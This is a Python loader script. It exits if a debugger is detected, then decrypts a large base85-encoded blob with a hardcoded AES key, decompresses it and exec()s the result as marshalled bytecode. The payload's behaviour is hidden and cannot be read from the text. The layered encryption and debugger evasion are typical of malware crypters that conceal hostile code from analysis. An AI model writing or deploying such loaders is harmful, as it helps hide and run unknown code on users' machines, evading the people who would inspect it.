
import sys
import os
import base64
import hashlib
import marshal
import zlib
import traceback
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _anti_debug():
    if sys.gettrace() or (os.name == 'nt' and __import__('ctypes').windll.kernel32.IsDebuggerPresent()):
        sys.exit(1)
_anti_debug()

_KEY = b'\xa4\xad\xf8\xecHn\xc5\x98\x14\xe7\x1d\xcf\xc9R\xe6h\xac\xff@\xbf\x94\xc0-\xe9\x1f\xc8^\xf9~.\xa2I'
_IV = b'\x0c\xa7h\xdc\xfa\x90\xb0d|Tx\xcc1+\x93{'

def _decrypt_str(data):
    try:
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        return unpad(cipher.decrypt(data), 16).decode()
    except:
        return ""

def _main():
    try:
        _encrypted = '7rpM3Ux-Rl6`9TSnGgi0w)#8Y%cV}tjp?|iWhl@Lfw+2L@Y^~il@_y~CH=VQORwxt-Mw|$f-wl_@KaM#H?>4l6j{hnPnymM9+iIi_CVRF5g*d#tV5<a6IM>W<sryD@Kp{jzDghWfX`lQQ~8x?3czrs(zBus*~zW5-6(J@EA4n&XJ7Gr?ZHCQdUFc{tML=+KZ;#-TQN*!rn#Z`GdhPH-Km_K6Eli-F*ZVHB8KxwbPxjCr|Nam>`!_tjW%PjzSjzSNn5tZb3q>C<VY;*E3XEgLL1u1eO8^G%?p%3D(c|~H)CQ=;=QF>M;Jzf{PPG@W1!!`ELP9^FxI;0%Xvp4f3$|%7o|Eup4m}ByKXX@j6`wv#PZc$5})p6uNh6HlyoLGEtAX0OQ)d>y_Yauz!}vhq+A`k8n{O)Z$X|u8j024uo4x)co_e;*fuZ(5+?4-$0+yAxbB<Iv!3OC-fW2_&-sAqNKqh0e2V{b=wXNC=C2Y=4U6D?$b_2>onk@czq`Wn;NUgbn<*5B#pjxC7-kMNwZ9G-vc~-6ze#<s`GACr@5TSVRw|HCSs`Tz8%MJhs(}MnDXLkwA|P1zwVYe#d-bPQE=S*gaqGh-P;;8FQo4P9;`2_|b|aUm^j3o}8PMh04;ML1d-)ulu+@5s{DPD!bK-tSVg4CXjm!G-rz4H^&<lcH)pJE+joi;s1zhK2Af+$dacXRWo>LK^)$LW1=($txi`gHTX*A57bM{8r4Qc>>b3ihVJW%X!=ZAcJ`kzK6>=}w3J(#Y<No|wN3qB7$PklWdpV~s{GM!&ave!w2vW`1qGtL=UmNej%^k86eh@j{Y_v>lMvjQop?)>M?CHjmCGv;o1fqd@)G9F?X{@bjt)T*zrS%<%(+1v-``0=%7z;*kf%$&8P*B+*%BY=kdn7xI|_fjKIILPuA$xgBI$<9P!UN76fQH_AC(!j1Ite<?}{=kjbkD^Y-J+!Umr<6{iw+?_pj(g<239xmJE>kI2+0eQ_YGEtS7PZ%!0`Hi&?(`;~4bHq%kJ1UWGUYC#D_k<{qW3biNeA^GAWnz|>!16lhYMvpJX2?iI;3V4&!z<2QDR#k9K5E|<2@uun9|ulgl>}dkCwR!y-e&{gx&F$UW`fFD^d#;*XVveidATQC*eH3py{GNZ3e{X@crB`Aa>-in~eN03pAX6P+MmCr;gq8z(VsK-EasBe9~8fZ~BI^0s3LOUO%oC_y0P5DoTY@WUMs2-EW67Bt(!0qX8iC%El>GbqL*~3<F%jh(OVfvVm_z53Cj2^JzgBVo&WDJjI{ToZH3w#9W&kuApr7I}2RbPAZ-*8SB;ACjDsC<d-SjtAFNfiF96^bM#g9O3k+_nkOyHE@L$@s25L~%)+wq0dhK`xa5aFR*15pC&B_TW}~5d%f7Qa``4D2OWi$Ks|JpMsD_b1RS(6ZXzHo_bE)9jQ=2{aqVJ`v!cmu1Zpfd@DK4!Xx`r)~TS*HkR_W=FvpDX!{qo_JCG=JK>hX=szNi%Kx<IScVIH{jyGHqPr6<=Ov6~f*P_>UEUBtt^b*+Ai)VrS%P_rim^?)mmi<qswf)<o4k&8ho1PF>c$xk~q7W?X5FC{WFvrpq{C+F~cM*sz^95!yd(F_%#Eq@RHGFy@8t!1WWU~=6sEf;_s20voO$@u*Ss>G{fz+!ABheAJUzM0SQ=PiA^5}<i<s5Gb$Ne!`n>a002p8<x(mD(AG^JQVVXEY`<y3{fb1Yh@RFG3rT6uX<{Xfe2LOKDEw+3RCo`<my0!37O8@w>|c6CfDEYdG`RBnHwo9d>}pT`#0whSuxg8W7J}SuawJZo#3KSfnqVPk}H-sSh?w_*J?gs5-f2s&$4o@pJ0OJ+VvnKnA%@5(U93?Rk;A3{Hgg*cE?UZ*`~<+E6bG{TcA&B&bib9*OxA=8-WpiBGMV10T9<h+6qdEiJ4Luolu~!3K%vau}xS<%hqI)}BQ79z}yy5L!lpq1c8>(=w)-NRbHabR}3SIe%{6ca;1d;y}jCl;oO-Y28`kr4<N9VG-73DY%iQ;J)dDDJw*sS*nk1IO4P={5k|8!@stSqIUy|O4OGbyyY$AqPxL^x=bS-q-S~{h6JTh4hk!I8ePuAAvVTtLx`wHO1g8>)kRMqGcCb`07E46vw5jzv}sSrzB(Cjt;8z5^{^XB)UgC%@oQ=4;{1S?U;Nj|4I32s32+9ZB*n_d?%}jzKN0<>8M+OH&ez<x&sj79OII`Mrsb=VQQZ|=^`t5vKkVG}LG}kN)b71g3n}OUdLv1Nrea{aSWxTk{J~V$EqQ;DzULZ+1uRcV*N3G3ZH~hzc+&f(+}Im74@D$TItz1!NmesF)f**dSxA}pjKIiZg#0dc2c_)~fR<|PCfEN9ern)J=#-G>C)L^aE5k*eh>FFCXfr9Q?Zk5{z|9#YkQ?Gkig;<4A=a;2o3~J1Md{@|EBDu^vQBrQ^wt3q)F_-x1^*wnDNar^qq|Dv1)Li4NWl({V*4D0rIy0o5EfRmd2^q_NNS5p=&a12CHS$58M(76`uAvQCVRZWp>P1(^xzn;{ETeqiD)lNHoENb$ob9pszTB8&Azc`6^Z-s40x>8F)>&PJ4x|&+y1nUzC-I+z3*(Jf7-^aFX~u}U4(!ET$yKynE-nkzw{qeMMJE>x`WwVYkU$#&<~)UnI<OM<Lk)-4(Z_{&Lt^m#k)l<n8=r?q4Sfx;>Fe#EMOh$nFhr_RVzcsK?DzMF&2$0_f?RmsvkZcu*NFUH;+zaCp(DjgWC$)Xu)`gPq`Zl*g(mYKBtvO`v@X}$ki4Jy7LS6e^7QXV{EC-6L(mKKtrVh70%&*%eED>GiJ0VQ&EQJ$X`MIAqIm3+7}@;gQ+?nhtU`Qp=6lzE@%77b&<n`$*pt-6hr4{nCnrX(LDKl$WBe;yrg7`ju@C!)EdXh&bhG$pLd!zROYs=y5FF4Z>J-r_?95%FVK8erguwnFU!S`x3idl8A_Au_aFT1&>cWwPLU6BF{1{**ZI8!D&n-einz%?np|hpwtxWyaAJ8zVg(_O+?s{~@dW#T(XI*Q4rQ@#%F`y}6Y7So3+QJUk{dI=_Yl5sk9THCxa%-Mz>bBgoV-v%>7u>mqwB&G`-sxN3eB2`{)qPV)+0aQy^3ab%7X+Bq#yL_-Xe-)UAsAYY}2cHGdF-Pr1<+nk-{lc6w)AkhdZ~PJsM?xTT=edLRJc#o^nHW|3aGslP@Py{>hGNaa2DGs{w^TGr<zi1;tSruu?AM=4zGRXE~=B#m}<){2`W{UV)UK;#~9!sv){V^k4APSwZl=hjnhI!S2pemk}+@os@BhO?~9Nf2ECuPu@mkyZfH~gr;FzUglnM`8V^k@pz2-+B8d3$Msn;Ewx{X$*5iskI%(&D4hL@RW&xa4et9@;3vm@@r&89)x5-nU`Vo~K-(qpz+u;FJR^p4fV>i&0kPJnT$sWJ1(YBa*9)2i6f=V4fgX&&!>WVXfgl@7_MHU)j$X50T7|fcjEsSyD>oZeJRSH~lTlR(TTawj<!shv$$(~OV6S4=6?mQM61iBnGev&efl>HS@T4HLRXuWa9qO0~1`>KpC_v$<iinm3GO4lkgFzG7cu{&wxgoe~Cp#5UEVcb+>8A@@dXPF_Jv60n$D2T(!}R;t9g*n#5p{=jjieO9w-Ld$D4%AtF9SrD<NKfk=^c_Fc6;J#tt#HO4lWKT^A@gg5pfGH6j^)-7UW&U4*~WINASJMAvz|hkanB(JIk*Wn(=N}thhfI6+XvvEM(yk>8!NX+m+C%LW<CiB`wsZWVPfMIKMrMfPTik>m?;{o`i-~f4uprG#kv~ZYcZc*si0P_qYLVCD;$F*!-#h(9rTD9hf&FFWd0N5VFmVA?Y@BV2B&ieW^fanP;U9IQ3LLj5w}@ZI<F!SR{#1M0o&}C{Vws*Uom+%CGivs1^UO59i=zJL8i+Xxq;moxw|uo1Rd|!7VEEHX1x@)GeesANU+@Q|JSsz3W14Y+R1TI;N}Rx5j~y?`Q=gq+rAI(q30UL<lT}cS=56N$y7JL=gV7E%a4k!e@oJJh?fU-`^uuJeFvCR|*3Ibrs$S^6u;3sQj`gLB$r_cD&d%`!*qcx?y_89-p&_@NuiuI%SAa3$^A@sn0pW8g&<H3jnsk$nLhIM2eSipc0jB2A>!8_TO9iaQ)}Uwzo^Jc=EEieXkyS)xDCU3VYlpc7<$cVxCb<Lj~`I#50bM9iMTYCa}3Pb84=LmYdLjW|4Bz2jrp_!v@C&A&Q|$RgmHwjbM+_uXk&kv^6Yf_&V%8PN7T~P3_j(iqv8AcIJa|)xG8XJH;k~Ot6468@0&OXJ-zP@vAqM8KFsu1aun{5S`e=xtY=yhCgIbGbM!KS$dy&%QA=WKuBg*lQbzlK-^_rcC_r@z<Px0=b2~1`9jrr2O=m5giBzjZYw)S1ssDYZjSWtFu8hBK(8JN<!R|d2~bmwzQr!TjExWk6Nrx1+bZo2XGcZ;go5H9T7=-WZq32QbDP?0-YBuqwF-4T*SI7L26p{8BeZ*7+EH>=(}F%zjZ+43qpv`y0R-)Yn|g}7Obpi&ee2)gJKa3SolcfLk{v=Ga|#G&=IdMw7QoLC0PLSEhqJBhBAp6MxyhAqFmp@cv58mf?{hb#RgC6>P7xw54V=Www?=7aN@4rS`Pw%+QI{rZ6CAol&TBjHy6U$`y5dz*QMXyjjAoXeJvHYinal4CeDZmg{nXE^C897#+Ny(N(d_PDemFhPT<roRZ0^xbh>AR1$0&4HRdS$>(g3E(6uhh47?BmL)H1RHtZeX|8IrRMLH+yXCE)KGIqL#fSrD{K_gs&<FQqU2YRgp`&nU53u4>!~yksW2OD@`-TZ^z6?{j;|VyXuIXoivHw7(q{0rs)?T=29hS?jKb%1DqZR=xy*an%D)OO^raGf1v_o@Q2GWVsuA@-pcnT|s5Z1>G&6dJ(}CJ3UGjKV~=QMW6(-&Tj^sPM17K7I2xX!mgqWT*-E&O>BUz2*$EDsnJG4gfJDOtG{o41ubSWWP`Q(#f~-BjMJ`wslH?;j(X98Bh$P7O==AdGR)Izip*pWg=3c7=-t+lJ0?2X)1-k0@FYm-j67JFX5mPQyM6R={b{*|4!s-EjQy}R78Lyag6J*BU)xRl+Kp$Iw>N8>4K1rM+e6+r2wQ-2SUEclW4EbfLUl`5-d?aJr2jNV<IOdhp7mD+M>UXLYM?rxCtv52E1%Rjgq`2ux!zc05&*=<*6vtu)Y-eVsStW>5*VStoEmA7GYGJ_DaTtC93gkir}}~sbCxWtTU-y-?zwnz$VY)kB`7B<v|M%lu3zL@>-<?T-FNJ<hCU1Y!|8Ygqq7(<QSOIo9=gV%pu9co#|4Tk>94CM0tgX0)ixs8k0uCp%i4u&ZY_HhZ*h&QX4Iv12-;)i{u6p~FWYoq7|D;@px=^#cZVh#9|+^(Bkek7rV@Yw>7SusZ7Dl>+B-1FYB5PIEIXv|zVx7vuunj#>f$uxLx#`xje?q<=V`|?$L%0%fQtl_IaH@E+%XLKKo2Y}J^T1>a&}@;GQB-~lxKTx%A7nUsJtV}yxcQA#Z1c=jwjV~tzVwc*vQnZM8^_^I|$(8&TBe;R?$}!*FQgsN~QiJgM#un4N<HD088b&$0kYLOEH~IRbAJ+0>T$k6#lVC)6q74b9?9!5P)|C)xU8_<Ns~%JaP%sxs=*<K4&3WCl_e#=qVWVqJm}EH)DdYS+Uvi_E`%vOwf>Xm^CpO?G|d3H@`2r9iq6rY#Tr%4S%@AU-TA{IeS{S0<Zt39Lt1_o4j(I-yo=Ed|$l!n7zSUtf8%l!@B{qZYWXa`ATYD0_Q!pd$Q(@^nxPraJ6bAkR4#A(@Lc}_OdYeiMFS|p+~MrzPo6^7@UU}wQQqOe8TAG#YuA`dU4~g@fo~s=ed58%5qUGqX5fQKPnM%KC3uw28I?~jidd$JrnCuYQM>&ulF@i4OT~fRheR<l6Kc)QW=TZsOzZr)OAa1z7Uq(P00-{!%&UCOL2kxF+Ox8ghAg+n@v`B$S=CJvGQ?s6$?f30g|}h4xKUR#EP>-l;4Ap6cUh0J-Kf<`T!1ibIL%j)mQqj8G<q;$%CC}yOQ>)HS`Axd6NE*Ia80E|JvcEH1&f)$c%IC+;<g?qUIj%*pi+CEU&|jV@;L-zhs5FLn-})(r$Bj7IPpie2OlXlRv~#sWQh``U?lrt%<ejRsJm}VKV0PX{6>0E}IK3{v(l2RVwO(AZrf(BKgK)y`1hdUDe$}JpFmOk&TqIqGTMMn4Zv!Mgj66{Pc4FSTrY56%Uc@T@~?YS$R8d4V>g^*gb!hbUI{o43$>zfSo0~n3X+78?F}Z5KOleLy+Wp6*syMAd*#N(8u+v<A3&6jRnt*<9WBjYaO4EFqvWkGJBk<Z|cHKWBPsq6fG;SEtjhLTGtHWs58vPb2F#lq!RN*gy@-W2lYq^M~V@Vv8+2Eu89}V3L$x3e?Nma*LwR$jXSCyV?h$^%~hx3z`=OOz4IXtfB69<FDNh}J%!E=>4dw3j-TTC!y*_^>g2V=Al}oUHowH?_EnGSzmwsiqeHWnQn9`kExVxkAWD^T@hoOP#h<Io&GP9TXSI(5M1T2*IQkR%JOU?<;2?h2z?p9Tb}{HXoF!}sX+zw#q1$sqHW3}o@e7*5vt5lw>x3F6`#-4z;PSe&AWZQziqP2H-MNwr(=oZGtB7s>WE+Mov`Cv-x8NuIx#UQn%M^@RCEP$^xa%iiZ!swD@j&>!BhKyy4hOIOa6$V?&O>is=o>tL%hTBu*%)nCebkxH@#lpm2VWV<d^8+7s(17J89#x-G?fEYiASkLl5r(UMxpV2ofad6;-&5tMe$NFh9+g1wE1`JfG~k>;mhcA3VRX5OUF=Xn&iQ9z7PT*P>z%rPn~<nI=+3GCO!Okow!>^k2Z@(Vn=G_(%j16TJSeN6tF78``)vg0+VG07I6{N5pW=q(A|XxR_2HeEww_EY$8#VhtSr(9O@fjR^TBpH{%g%;wLH(I9z(T9}%u8<fvdc$2&b|5+QhqF*G@4*>{W|>>;KUGZ^^Iw4MvA`JN3?G{p0FzWzfuYdSU6_)jhRlJ99*Pt%bU;T{8R#h`KxTEbEjGY9Bjf`UKC;WqD)i&j;oUXN|ckE{NxAuG-Vq9ySOh%Zo0ZyQjs4=!BKFdkR;4zB7}js{X!(n}vK^j&(5Vw^J5aO2^NZ%9o_i%>g)f;!CtCUlFY>aqSU*oJ+*JI`f$ZAVukP38ube7wuLZ-NmPbh?;fOltEDg*3q-ZXIzrKzS;}yfO}!)?GFey&Ca>5i9qi?_txPS1Typpiz*i6HH?(%)!@k0&bOKD=&f;>miiH)2vY4)AOmEJs&~-t=5*LBmkFiw7J#YtSM97aTmFU%RT>$&pCgWRLAu5y<?3U`I`Y75I9b&#}9iikw}$(Qc#<;Og&VC6;v!+sKemP>F^76v%-tp1So3G4LKwf)Pf|QAl7Q$Q`LW4g2lm5PCNhAR?a++o5O8s5ue|y@jOon`IvNZQkh+`;)~7YlWTdTcQ#nZAubpmB}WK5rZ0|_dSxrZ&v9q9^Z#4zYc`67#nQ&9!}04F+KJA+'
        
        # Decryption steps
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        encrypted_data = base64.b85decode(_encrypted)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), 16)
        decompressed_data = zlib.decompress(decrypted_data)
        
        exec(marshal.loads(decompressed_data), {
            **globals(),
            '__name__': '__main__',
            '__builtins__': __builtins__,
            '_decrypt_str': _decrypt_str
        })
    except Exception as e:
        print("Execution failed:")
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    _main()
        